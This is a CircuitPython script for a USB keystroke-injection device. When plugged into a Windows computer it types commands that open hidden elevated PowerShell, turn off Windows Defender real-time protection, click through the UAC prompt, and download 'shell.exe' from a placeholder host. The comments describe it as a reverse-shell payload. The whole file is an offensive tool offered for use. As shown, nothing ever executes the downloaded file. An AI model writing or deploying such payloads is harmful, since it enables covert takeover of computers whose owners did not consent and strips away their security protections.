import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS as KeyboardLayout
from adafruit_hid.keycode import Keycode
from time import sleep


kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

# ducky payload starts here

# Turn off Windows Defender and start reverse shell
#
sleep(1.0)
kbd.send(Keycode.GUI, Keycode.R)
sleep(0.2)
# Start an elevated powershell instance which will disable Windows Defender.
layout.write("powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs")
kbd.send(Keycode.ENTER)
sleep(1.0)
# if you need administrator [left, enter and delay 1000]
kbd.send(Keycode.LEFT_ARROW)
kbd.send(Keycode.ENTER)
sleep(1.0)
kbd.send(Keycode.ALT, Keycode.Y)
sleep(1.0)
kbd.send(Keycode.GUI, Keycode.R)
sleep(0.1)
layout.write("powershell -w hidden wget http://ip_address/shell.exe")
sleep(0.3)
kbd.send(Keycode.ENTER)
sleep(3.0)
layout.write("exit")
sleep(0.1)
kbd.send(Keycode.ENTER)
